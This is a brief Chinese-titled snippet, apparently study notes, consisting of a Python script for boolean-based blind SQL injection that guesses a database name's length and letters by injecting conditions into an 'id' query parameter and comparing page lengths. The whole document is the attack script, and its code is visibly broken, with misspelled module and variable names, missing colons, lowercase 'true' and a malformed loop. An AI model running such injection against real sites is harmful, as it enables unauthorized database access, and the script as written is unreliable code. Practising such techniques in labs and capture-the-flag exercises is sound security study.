#布尔盲注
```
import requests
import string

url=" "

normalHtmlLen=len(request.get(url=url+"?id=1").text) #计算返回报文长度

print("The len of HTML:"+str(normalHtmlLen))

dbNameLen=0

while true:
	dbNameLen_url=url+"?id=1'+and+length(database())="+str(baNameLen)+"--+"
	
	print(dbNameLen_url)

	if len(requests.get(dbNameLen_url).text)==normalHtmlLen
		print("The len of dbName:"+str(dbNameLen))
		break

	if dbNameLen==30
		print(error)
		break

	dbNameLen+=1


dbName=" "

for i in range(1,9): #从1到8循环
	for a string.acsii_lowercase: #从a到z循环

	dbName_url=url+"?id=1'+and+substr(database(),"+str(i)+",1)='"+a+"'--+"
	print(dbName_url)
	if len(requests.get(dbName_url).text)==normalHtmlLen
		dbName+=a
		print(dbName)
		break
```